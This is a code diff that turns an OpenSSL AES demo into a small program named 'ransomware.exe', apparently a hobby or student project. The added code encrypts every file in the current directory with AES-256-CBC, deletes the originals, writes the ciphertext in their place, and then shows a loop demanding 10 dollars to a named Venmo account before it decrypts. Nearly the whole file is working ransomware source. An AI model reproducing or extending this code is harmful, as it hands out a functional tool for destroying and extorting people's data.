@@ -1,128 +1,212 @@
+#include <cstdio>
+#include <iostream>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+//#include <tuchar.h>
+#include "crypto-algorithms/aes.h"
+#include "crypto-algorithms/aes.c"
 #include <windows.h>
-#include <wincrypt.h>
-#include <openssl/conf.h>
-#include <openssl/evp.h>
-#include <openssl/err.h>
-#include <string.h>
+#include <string.h> 
+#include <iostream>
+#include <fstream>
+#include <vector>
+#include <string>
+#include <dirent.h>
+#include <direct.h>
+//#pragma execution_unsigned character_set( "utf-8" );
 
-void handleErrors(void)
-{
-  ERR_print_errors_fp(stderr);
-  abort();
+unsigned char * CTXT_FROM_READ;
+unsigned char * CTXT_ORIGINAL;
+char * NAME_OF_PROGRAM = "ransomware.exe";
+void get_file_names(char * path){
+  DIR *dir; struct dirent *diread;
+  if ((dir = opendir(path)) != nullptr){
+    while((diread = readdir(dir)) != nullptr){
+      printf("%s\n", diread->d_name);
+    }
+    closedir(dir); 
+  }
 }
 
+unsigned char* read_file(char* path, long &ptlen){
+  FILE *fileptr;
+  long filelen;
+  //printf("start of read file\nptlen: %ld\n",ptlen);
+  fileptr = fopen(path, "rb");  // Open the file in binary mode
+  fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
+  //printf("made it past fseek\n");
+  fflush(stdout);
+  filelen = ftell(fileptr);             // Get the current byte offset in the file
+  rewind(fileptr);                      // Jump back to the beginning of the file
 
-int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext)
-{
-    EVP_CIPHER_CTX *ctx;
-
-    int len;
-
-    int ciphertext_len;
-
-    /* Create and initialise the context */
-    if(!(ctx = EVP_CIPHER_CTX_new()))
-        handleErrors();
-
-    /*
-     * Initialise the encryption operation. IMPORTANT - ensure you use a key
-     * and IV size appropriate for your cipher
-     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
-     * IV size for *most* modes is the same as the block size. For AES this
-     * is 128 bits
-     */
-    if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
-        handleErrors();
-
-    /*
-     * Provide the message to be encrypted, and obtain the encrypted output.
-     * EVP_EncryptUpdate can be called multiple times if necessary
-     */
-    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len))
-        handleErrors();
-    ciphertext_len = len;
-
-    /*
-     * Finalise the encryption. Further ciphertext bytes may be written at
-     * this stage.
-     */
-    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len))
-        handleErrors();
-    ciphertext_len += len;
-
-    /* Clean up */
-    EVP_CIPHER_CTX_free(ctx);
-
-    return ciphertext_len;
+  //printf("ptlen: %ld\nfilelen %ld\n", ptlen, filelen);
+  fflush(stdout);
+  unsigned char* buffer = (unsigned char*)calloc((filelen), sizeof(unsigned char)); // Enough memory for the file
+  fread(buffer, filelen, 1, fileptr); // Read in the entire file
+  fclose(fileptr); // Close the file
+  ptlen = filelen;
+  return buffer;
 }
 
-int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key, unsigned char *iv, unsigned char *plaintext)
-{
-    EVP_CIPHER_CTX *ctx;
-
-    int len;
-
-    int plaintext_len;
-
-    /* Create and initialise the context */
-    if(!(ctx = EVP_CIPHER_CTX_new()))
-        handleErrors();
-
-    /*
-     * Initialise the decryption operation. IMPORTANT - ensure you use a key
-     * and IV size appropriate for your cipher
-     * In this example we are using 256 bit AES (i.e. a 256 bit key). The
-     * IV size for *most* modes is the same as the block size. For AES this
-     * is 128 bits
-     */
-    if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
-        handleErrors();
-
-    /*
-     * Provide the message to be decrypted, and obtain the plaintext output.
-     * EVP_DecryptUpdate can be called multiple times if necessary.
-     */
-    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len))
-        handleErrors();
-    plaintext_len = len;
-
-    /*
-     * Finalise the decryption. Further plaintext bytes may be written at
-     * this stage.
-     */
-    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len))
-        handleErrors();
-    plaintext_len += len;
-
-    /* Clean up */
-    EVP_CIPHER_CTX_free(ctx);
-
-    return plaintext_len;
+//create file
+bool create_file_bin(char* path, unsigned char* data, long size){
+  FILE *fileptr = fopen(path, "w+b");
+  fwrite((uint8_t*)data, size, sizeof(uint8_t), fileptr);
+  fclose(fileptr);
+  return 1;
 }
 
-int main(void)
+bool create_file_char(char* path, unsigned char* data, long size){
+  FILE *fileptr = fopen(path, "w+");
+  fwrite((uint8_t*)data, size, sizeof(uint8_t), fileptr);
+  fclose(fileptr);
+  return 1;
+}
+
+//delete file
+bool delete_file(char* path){
+  if(remove(path) != 0)
+    return 0;
+  return 1;
+}
+
+unsigned char* enc_file(char* path, WORDA * key_schedule, const BYTE iv[], long &lenPT){
+  unsigned char* plaintxt = read_file(path, lenPT);
+
+  if (lenPT%AES_BLOCK_SIZE != 0){
+    unsigned char * temp = (unsigned char*)calloc((lenPT + (AES_BLOCK_SIZE - lenPT%AES_BLOCK_SIZE)),sizeof(unsigned char));
+    memcpy((void*)temp, (void*)plaintxt, lenPT);
+    free(plaintxt);
+    plaintxt = temp;
+    lenPT += (AES_BLOCK_SIZE - lenPT%AES_BLOCK_SIZE);
+  }
+  unsigned char* buffer = (unsigned char *)calloc(lenPT, sizeof(unsigned char));
+
+  aes_encrypt_cbc((BYTE *)plaintxt, lenPT, (BYTE *)buffer, key_schedule, 256, iv);
+  return buffer;
+}
+
+//dec file
+unsigned char* dec_file(char* path, WORDA * key_schedule, const BYTE iv[], long &lenPT){
+  long encLen; 
+  unsigned char* ciphertxt = read_file(path, encLen);
+  //printf("filelen %ld\n", encLen); 
+  unsigned char* plaintxt = (unsigned char*)calloc((encLen), sizeof(unsigned char));
+  aes_decrypt_cbc((BYTE *)ciphertxt, encLen, (BYTE *)plaintxt, key_schedule, 256, iv);
+  lenPT = encLen;
+  return plaintxt; 
+}
+
+//enc dir
+void enc_dir(char * path, WORDA * key_schedule, const BYTE iv[]){
+  DIR *dir; struct dirent *diread;
+  long len = 0; 
+  if ((dir = opendir(path)) != nullptr){
+    while((diread = readdir(dir)) != nullptr){
+      //printf("%s\n%d %d %d\n", diread->d_name, strcmp(diread->d_name, NAME_OF_PROGRAM),strcmp(diread->d_name, "."),strcmp(diread->d_name, "..")     );
+
+
+      if(strcmp(diread->d_name, NAME_OF_PROGRAM) != 0 && strcmp(diread->d_name, ".") != 0 && strcmp(diread->d_name, "..")!=0){
+        len = 0;
+        unsigned char * buffer = enc_file(diread->d_name, key_schedule, iv, len);
+        delete_file(diread->d_name);
+        create_file_bin(diread->d_name, buffer, (len * sizeof(unsigned char)));
+        free(buffer);
+      }
+    }
+    closedir(dir); 
+  }
+}
+
+//dec dir
+void dec_dir(char * path, WORDA * key_schedule, const BYTE iv[]){
+  DIR *dir; struct dirent *diread;
+  long len = 0; 
+  if ((dir = opendir(path)) != nullptr){
+    while((diread = readdir(dir)) != nullptr){
+     // printf("%s\n%d %d %d\n", diread->d_name, strcmp(diread->d_name, NAME_OF_PROGRAM),strcmp(diread->d_name, "."),strcmp(diread->d_name, "..")     );
+      if(strcmp(diread->d_name, NAME_OF_PROGRAM)!= 0 && strcmp(diread->d_name, ".")!=0 && strcmp(diread->d_name, "..") != 0  ){ 
+        len = 0;
+        unsigned char * buffer = dec_file(diread->d_name, key_schedule, iv, len);
+        create_file_bin(diread->d_name, buffer, (len * sizeof(unsigned char)));
+        free(buffer);
+      }
+    }
+    closedir(dir); 
+  }
+}
+
+void randsom_note(){
+  char c; 
+  while(1){
+    printf("Did you send 10 dollars to the venmo account (@Henry-Helstad)? (y/n)\n" );
+    Sleep(10); 
+    c =  getchar();
+
+    if(c == 'y' || c == 'Y')
+      return;
+  }
+}
+
+int main()
 {
-  //set up key gen/iv gen later 
-  unsigned char *key = (unsigned char *)"01234567890123456789012345678901";
-  unsigned char *iv = (unsigned char *)"0123456789012345";
+  //printf("\nbegining of setup...\n");
+  //TEST ----------------------------------------------------------------------------------------------------
+  //Hard coded the key and the IV needs to be changed
+  WORDA key_schedule[60];
+	BYTE enc_buf[128];
+	BYTE plaintext[1][32] = {
+		{0x6b,0xc1,0xbe,0xe2,0x2e,0x40,0x9f,0x96,0xe9,0x3d,0x7e,0x11,0x73,0x93,0x17,0x2a,0xae,0x2d,0x8a,0x57,0x1e,0x03,0xac,0x9c,0x9e,0xb7,0x6f,0xac,0x45,0xaf,0x8e,0x51}
+	};
+	BYTE ciphertext[1][32] = {
+		{0xf5,0x8c,0x4c,0x04,0xd6,0xe5,0xf1,0xba,0x77,0x9e,0xab,0xfb,0x5f,0x7b,0xfb,0xd6,0x9c,0xfc,0x4e,0x96,0x7e,0xdb,0x80,0x8d,0x67,0x9f,0x77,0x7b,0xc6,0x70,0x2c,0x7d}
+	};
+	BYTE iv[1][16] = {
+		{0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f}
+	};
+	BYTE key[1][32] = {
+		{0x60,0x3d,0xeb,0x10,0x15,0xca,0x71,0xbe,0x2b,0x73,0xae,0xf0,0x85,0x7d,0x77,0x81,0x1f,0x35,0x2c,0x07,0x3b,0x61,0x08,0xd7,0x2d,0x98,0x10,0xa3,0x09,0x14,0xdf,0xf4}
+	};
+	int pass = 1;
 
-  //sample message get message l8tr
-  unsigned char *plaintext = (unsigned char *) "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.";
+	aes_key_setup(key[0], key_schedule, 256);
 
-  unsigned char ciphertext[2048];
-  int decryptedtext_len, ciphertext_len;
 
-  ciphertext_len = encrypt (plaintext, strlen ((char *)plaintext), key, iv, ciphertext);
+	aes_encrypt_cbc(plaintext[0], 32, enc_buf, key_schedule, 256, iv[0]);
+	pass = pass && !memcmp(enc_buf, ciphertext[0], 32);
 
-  printf("Ciphertext is:\n");
-  BIO_dump_fp(stdout, (const char *)ciphertext, ciphertext_len);
+	aes_decrypt_cbc(ciphertext[0], 32, enc_buf, key_schedule, 256, iv[0]);
+	pass = pass && !memcmp(enc_buf, plaintext[0], 32);
   
-  decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv, decryptedtext);
+//  SetConsoleOutputCP( 65001 );
+//  printf( "Testing unicode -- English -- Ελληνικά -- Español -- Русский. aäbcdefghijklmnoöpqrsßtuüvwxyz\n" );
+//  printf("if it passes the test: %u", pass);
+  //TEST ------------------------------------------------------------------------------------------------------- 
+  
+  //ENC FILE
+  /*long len = 0;
+  unsigned char * buffer = enc_file("test.txt", key_schedule, iv[0], len);
+  //printf("%s \n %d \n %ld\n", buffer, strlen((char*)buffer), len);
+  fflush(stdout);
+  delete_file("test.txt"); 
+  delete_file("test.txt.enc");
+  //Sleep(50);
+  create_file_bin("test.txt.enc", buffer, (len * sizeof(unsigned char)));
+  unsigned char * ptBuff = dec_file("test.txt.enc", key_schedule, iv[0], len);
+  //printf("\n%s\n", ptBuff);
+  create_file_bin("text.txt", ptBuff, (len * sizeof(unsigned char)));*/
+  char path[256];
+  _getcwd(path, 256);
+  printf("%s\n", path);
+  fflush(stdout);
+  enc_dir(path, key_schedule, iv[0]); 
+  randsom_note();
+  dec_dir(path, key_schedule, iv[0]);
 
-  decryptedtext[decryptedtext_len] = '\0';
 
-  printf("Decrypted text is:\n");
-  printf("%s\n", decryptedtext);
-
-  return 0;     
+   
+  
+ // Sleep(100000000);
+  return 0; 
 }
